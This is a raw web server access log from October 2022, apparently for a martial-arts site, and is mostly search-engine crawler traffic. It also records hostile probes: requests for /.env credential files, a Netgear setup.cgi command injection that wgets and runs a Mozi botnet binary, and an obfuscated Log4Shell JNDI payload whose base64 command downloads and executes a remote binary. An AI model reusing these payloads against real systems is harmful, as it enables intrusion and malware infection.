::ffff:157.55.39.207 - - [08/Oct/2022:00:05:36 +0000] "GET /images/books/karatedo.jpg HTTP/1.1" 200 3442 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:95.214.235.205 - - [08/Oct/2022:00:11:53 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:95.214.235.205 - - [08/Oct/2022:00:11:53 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:114.119.145.19 - - [08/Oct/2022:00:13:48 +0000] "GET /joinemail?type=tournaments HTTP/1.1" 200 8829 "http://34.212.47.6/events" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:107.161.81.166 - - [08/Oct/2022:00:21:02 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:107.161.81.166 - - [08/Oct/2022:00:21:03 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:51.222.253.16 - - [08/Oct/2022:00:21:11 +0000] "GET /contact?s=1&ss=6 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:49.12.131.247 - - [08/Oct/2022:00:24:02 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:49.12.131.247 - - [08/Oct/2022:00:24:03 +0000] "GET /sitemap HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:49.12.131.247 - - [08/Oct/2022:00:24:24 +0000] "GET /sitemap.txt HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:49.12.131.247 - - [08/Oct/2022:00:24:53 +0000] "GET /contact HTTP/1.1" 200 10017 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:49.12.131.247 - - [08/Oct/2022:00:25:22 +0000] "GET /contact?s=1&ss=0 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:49.12.131.247 - - [08/Oct/2022:00:25:52 +0000] "GET /contact?s=1&ss=1 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:62.244.26.174 - - [08/Oct/2022:00:26:16 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
::ffff:49.12.131.247 - - [08/Oct/2022:00:26:21 +0000] "GET /contact?s=1&ss=10 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:49.12.131.247 - - [08/Oct/2022:00:26:51 +0000] "GET /contact?s=1&ss=11 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:49.12.131.247 - - [08/Oct/2022:00:27:20 +0000] "GET /contact?s=1&ss=2 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:49.12.131.247 - - [08/Oct/2022:00:27:49 +0000] "GET /contact?s=1&ss=3 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:49.12.131.247 - - [08/Oct/2022:00:28:18 +0000] "GET /contact?s=1&ss=4 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:49.12.131.247 - - [08/Oct/2022:00:28:47 +0000] "GET /contact?s=1&ss=5 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:49.12.131.247 - - [08/Oct/2022:00:29:16 +0000] "GET /contact?s=1&ss=6 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:113.116.222.21 - - [08/Oct/2022:00:29:40 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://113.116.222.21:37917/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 148 "-" "-"
::ffff:49.12.131.247 - - [08/Oct/2022:00:29:45 +0000] "GET /contact?s=1&ss=7 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:49.12.131.247 - - [08/Oct/2022:00:30:14 +0000] "GET /contact?s=1&ss=8 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:49.12.131.247 - - [08/Oct/2022:00:30:44 +0000] "GET /contact?s=1&ss=9 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:167.99.144.251 - - [08/Oct/2022:00:31:12 +0000] "GET /:80:undefined?id= HTTP/1.1" 404 152 "t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//159.89.93.208:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87ICB3Z2V0IGh0dHA6Ly8xOTIuMjQxLjEzNy4xNTYvdm9pZC54ODY7IGN1cmwgLU8gaHR0cDovLzE5Mi4yNDEuMTM3LjE1Ni92b2lkLng4NjsgY2F0IHZvaWQueDg2ID52b2lkO2NobW9kICt4ICo7Li92b2lkLng4NiB0ZWthc29lc3RldmVhcXVp}')" "t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//159.89.93.208:1389/TomcatBypass/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87ICB3Z2V0IGh0dHA6Ly8xOTIuMjQxLjEzNy4xNTYvdm9pZC54ODY7IGN1cmwgLU8gaHR0cDovLzE5Mi4yNDEuMTM3LjE1Ni92b2lkLng4NjsgY2F0IHZvaWQueDg2ID52b2lkO2NobW9kICt4ICo7Li92b2lkLng4NiB0ZWthc29lc3RldmVhcXVp}')"
::ffff:49.12.131.247 - - [08/Oct/2022:00:31:13 +0000] "GET /events HTTP/1.1" 200 8805 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:49.12.131.247 - - [08/Oct/2022:00:31:42 +0000] "GET /resources HTTP/1.1" 200 194907 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
